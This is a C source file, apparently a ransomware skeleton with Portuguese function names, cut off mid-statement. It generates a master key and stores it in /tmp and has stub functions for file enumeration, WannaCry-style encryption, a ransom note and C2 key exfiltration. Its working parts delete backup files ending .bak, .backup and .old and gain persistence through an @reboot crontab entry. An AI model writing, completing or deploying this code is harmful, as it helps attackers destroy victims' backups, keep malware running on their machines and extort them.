#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <limits.h>
#include <syslog.h>
#include <ftw.h>
#include <openssl/rand.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <curl/curl.h>

/* === Module 1: gerar_chave_mestra === */
#define KEY_SIZE 32
#define B64_BUF_SIZE  ((KEY_SIZE + 2) / 3 * 4 + 1)
#define JSON_BUF_SIZE (B64_BUF_SIZE + 32)
#define OUTPUT_PATH "/tmp/.master.key"

void gerar_chave_mestra(void) {
    unsigned char key[KEY_SIZE];
    unsigned char b64_key[B64_BUF_SIZE];
    char json[JSON_BUF_SIZE];
    int fd;
    ssize_t written;

    /* Generate random key */
    if (RAND_bytes(key, KEY_SIZE) != 1) {
        fprintf(stderr, "Erro ao gerar chave aleatória: %s\n",
                ERR_error_string(ERR_get_error(), NULL));
        exit(EXIT_FAILURE);
    }

    /* Base64 encode */
    int b64_len = EVP_EncodeBlock(b64_key, key, KEY_SIZE);
    if (b64_len <= 0) {
        fprintf(stderr, "Erro ao codificar chave em base64.\n");
        exit(EXIT_FAILURE);
    }
    b64_key[b64_len] = '\0';

    /* Build JSON string */
    int json_len = snprintf(json, JSON_BUF_SIZE, "{\"master_key\":\"%s\"}", b64_key);
    if (json_len < 0 || json_len >= JSON_BUF_SIZE) {
        fprintf(stderr, "Erro ao montar JSON.\n");
        exit(EXIT_FAILURE);
    }

    /* Write to file with permission 0600 */
    fd = open(OUTPUT_PATH, O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR);
    if (fd == -1) {
        perror("open");
        exit(EXIT_FAILURE);
    }

    written = write(fd, json, (size_t)json_len);
    if (written != json_len) {
        perror("write");
        close(fd);
        exit(EXIT_FAILURE);
    }

    if (close(fd) == -1) {
        perror("close");
        exit(EXIT_FAILURE);
    }
}

/* === Module 2: enumerar_arquivos_alvo (placeholder) === */
void enumerar_arquivos_alvo(void) {
    /* Placeholder implementation for file scanning */
    /* In a real scenario, this would recursively search directories. */
}

/* === Module 3: criptografar_arquivo_wncry (placeholder) === */
void criptografar_arquivo_wncry(void) {
    /* Placeholder implementation for encryption */
}

/* === Module 4: gerar_relatorio_ransom (placeholder) === */
void gerar_relatorio_ransom(void) {
    /* Placeholder implementation for ransom note generation */
}

/* === Module 5: exfiltrar_chave_c2 (placeholder) === */
void exfiltrar_chave_c2(void) {
    /* Placeholder implementation for exfiltration */
}

/* === Module 6: registrar_servico_crontab === */
#define MAX_EXT 3

static const char *target_exts[MAX_EXT] = {".bak", ".backup", ".old"};
static int delete_errors = 0;

static int delete_callback(const char *fpath, const struct stat *sb, int typeflag, struct FTW *ftwbuf) {
    (void)sb;
    (void)ftwbuf;
    if (typeflag != FTW_F) {
        return 0;
    }
    const char *dot = strrchr(fpath, '.');
    if (!dot) {
        return 0;
    }
    for (int i = 0; i < MAX_EXT; ++i) {
        if (strcmp(dot, target_exts[i]) == 0) {
            if (remove(fpath) == 0) {
                syslog(LOG_INFO, "Removed file: %s", fpath);
            } else {
                syslog(LOG_ERR, "Failed to remove %s: %s", fpath, strerror(errno));
                delete_errors++;
            }
            break;
        }
    }
    return 0;
}

static int file_exists_in_crontab(const char *line, const char *binary_path) {
    const char *prefix = "@reboot ";
    size_t prefix_len = strlen(prefix);
    if (strncmp(line, prefix, prefix_len) != 0) {
        return 0;
    }
    const char *path_part = line + prefix_len;
    while (*path_part == ' ' || *path_part == '\t')
        path_part++;
    size_t bin_len = strlen(binary_path);
    if (strncmp(path_part, binary_path, bin_len) != 0)
        return 0;
    char after = path_part[bin_len];
    if (after == '\0' || after == '\n')
        return 1;
    return 0;
}

int registrar_servico_crontab(const char *binary_path, const char * const *dirs, size_t ndirs) {
    openlog("registrar_servico_crontab", LOG_PID | LOG_CONS, LOG_USER);
    syslog(LOG_INFO, "Starting registrar_servico_crontab for binary: %s", binary_path);

    /* Step 1: Read current crontab */
    FILE *crontab_pipe = popen("crontab -l 2>/dev/null", "r");
    if (!crontab_pipe) {
        syslog(LOG_ERR, "Failed to open crontab for reading: %s", strerror(errno));
        closelog();
        return 1;
    }

    char **lines = NULL;
    size_t lines_cap = 0, lines_len = 0;
    char *line = NULL;
    size_t len = 0;
    ssize_t read;
    int already_present = 0;

    while ((read = getline(&line, &len, crontab_pipe)) != -1) {
        if (lines_len == lines_cap) {
            size_t new_cap = lines_cap ? lines_cap * 2 : 64;
            char **tmp = realloc(lines, new_cap * sizeof(char *));
            if (!tmp) {
                syslog(LOG_ERR, "Memory allocation failure");
                free(line);
                for (size_t i = 0; i < lines_len; ++i) free(lines[i]);
                free(lines);
                pclose(crontab_pipe);
                closelog();
                return 1;
            }
            lines = tmp;
            lines_cap = new_cap;
        }
        lines[lines_len] = strdup(line);
        if (!lines[lines_len]) {
            syslog(LOG_ERR, "Memory allocation failure");
            free(line);
            for (size_t i = 0; i < lines_len; ++i) free(lines[i]);
            free(lines);
            pclose(crontab_pipe);
            closelog();
            return 1;
        }
        if (!already_present && file_exists_in_crontab(lines[lines_len], binary_path)) {
            already_present = 1;
        }
        lines_len++;
    }
    free(line);
    pclose(crontab_pipe);

    /* Step 2: Add line if missing */
    if (!already_present) {
        char new_entry[PATH_MAX + 32];
        snprintf(new_entry, sizeof(new_entry), "@reboot %s\n", binary_path);
        syslog(LOG_INFO, "Adding new crontab entry: %s", new_entry);
        if (lines_len == lines_cap) {
            size_t new_cap = lines_cap ? lines_cap * 2 : 64;
            char **tmp = realloc(lines, new_cap * sizeof(char *));
            if (!tmp) {
                syslog(LOG_ERR, "Memory allocation failure");
                for (size_t i = 0; i < lines_len; ++i) free(lines[i]);
                free(lines);
                closelog();
                return 1;
            }
            lines = tmp;
            lines_cap = new_cap;
        }
        lines[lines_len] = strdup(new_entry);
        if (!lines[lines_len]) {
            syslog(LOG_ERR, "Memory allocation failure");
            for (size_t i = 0; i < lines_len; ++i) free(lines[i]);
            free(lines);
            closelog();
            return 1;
        }
        lines_len++;
    } else {
        syslog(LOG_INFO, "Crontab entry already present; no addition needed");
    }

    /* Step 3: Write updated crontab to temporary file */
    char tmpl[] = "/tmp/crontabXXXXXX";
    int tmpfd = mkstemp(tmpl);
    if (tmpfd == -1) {
        syslog(LOG_ERR, "Failed to create temporary file: %s", strerror(errno));
        for (size_t i = 0; i < lines_len; ++i) free(lines[i]);
        free(lines);
        closelog();
        return 1;
    }

    FILE *tmpfile = fdopen(tmpfd, "w");
    if (!tmpfile) {
        syslog(LOG_ERR, "fdopen failed: %s", strerror(errno));
        close(tmpfd);
        unlink(tmpl);
        for (size_t i = 0; i < lines_len; ++i) free(lines[i]);
        free(lines);
        closelog();
        return 1;
    }

    for (size_t i = 0; i < lines_len; ++i) {
        fputs(lines[i], tmpfile);
        free(lines[i]);
    }
    free(lines);
    fflush(tmpfile);
    fclose(tmpfile);

    /* Step 4: Install new crontab */
    char cmd[PATH_MAX + 64];
    snprintf(cmd, sizeof(cmd), "crontab %s", tmpl);
    int ret = system(cmd);
    if (ret != 0